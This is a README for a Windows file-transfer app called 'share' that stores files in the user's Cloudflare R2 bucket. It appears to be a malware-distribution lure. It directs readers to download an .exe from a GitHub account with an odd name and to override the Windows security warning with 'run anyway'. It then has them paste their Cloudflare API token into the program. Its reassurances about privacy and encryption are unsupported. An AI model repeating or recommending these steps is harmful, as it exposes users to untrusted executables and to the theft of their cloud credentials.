# 📁 share - Move files safely through your cloud

[![Download share](https://img.shields.io/badge/Download-Share-blue.svg)](https://github.com/snatcherrenerobertcavelier440/share)

## 🎯 About this software

Share helps you move files between computers. It uses your personal Cloudflare account to store data. This keeps your files private. You keep control of your storage space. This tool lets you pause and restart transfers at any time. You do not lose progress if your internet connection drops.

## 💻 System requirements

Your computer needs to run Windows 10 or Windows 11. You need an active internet connection to move files. The software requires 50 megabytes of free storage space. You also need a Cloudflare account. You can create a free account on the Cloudflare website if you do not have one.

## 📥 Getting the software

1. Visit the [official download page](https://github.com/snatcherrenerobertcavelier440/share).
2. Look for the file ending in .exe in the latest release section.
3. Click the file name to save it to your computer.
4. Choose a folder you remember like your Downloads folder.

## ⚙️ Setting up your account

1. Open the share file you just downloaded.
2. Windows might show a security window. Click more info and then click run anyway.
3. The software opens a small setup screen.
4. Find your Cloudflare API token. You get this token in your Cloudflare dashboard under the settings menu.
5. Paste this token into the field inside the share app.
6. Click the save settings button to connect your account.

## 🚀 Moving your files

1. Open the app.
2. Click the select file button to choose the item you want to move.
3. Find your file in the window that appears and click open.
4. Click the upload button to start the process.
5. A progress bar appears at the bottom.
6. Click the pause button if you need to stop the transfer.
7. Click the resume button to continue where you left off.
8. The app notifies you when the transfer ends.

## 🛠 Solving common problems

Most issues relate to your connection settings. Check your internet if the progress bar stops moving. Ensure your Cloudflare token remains valid. If the app closes, restart it and check your connection status. Make sure your Cloudflare account has enough storage space available.

## 🔐 Privacy and security

Share runs on your computer. Your files go to your own Cloudflare storage. No middleman touches your data. You manage your keys. You choose who accesses your files. Keep your API token secret. Do not share your token with other people.

## 📝 Frequently asked questions

Does this tool work with large files? Yes, it handles files of any size. The resumable feature makes large transfers easy.

Do I need to pay for Cloudflare? Cloudflare offers a free tier that works well with this tool. You only pay if you exceed their free storage limits.

Where do the files go? Files land inside your Cloudflare R2 bucket. You can view them anytime through the Cloudflare website dashboard.

Can I move folders? This version of share works best with individual files. Create a compressed zip file if you have many files to move at once.

Is my data safe during the transfer? Yes, the software uses standard encryption during the upload process.

How do I remove the app? Open your Windows settings. Go to apps and select installed apps. Find share in the list and select uninstall. This deletes the app but keeps your files stored in your Cloudflare account.
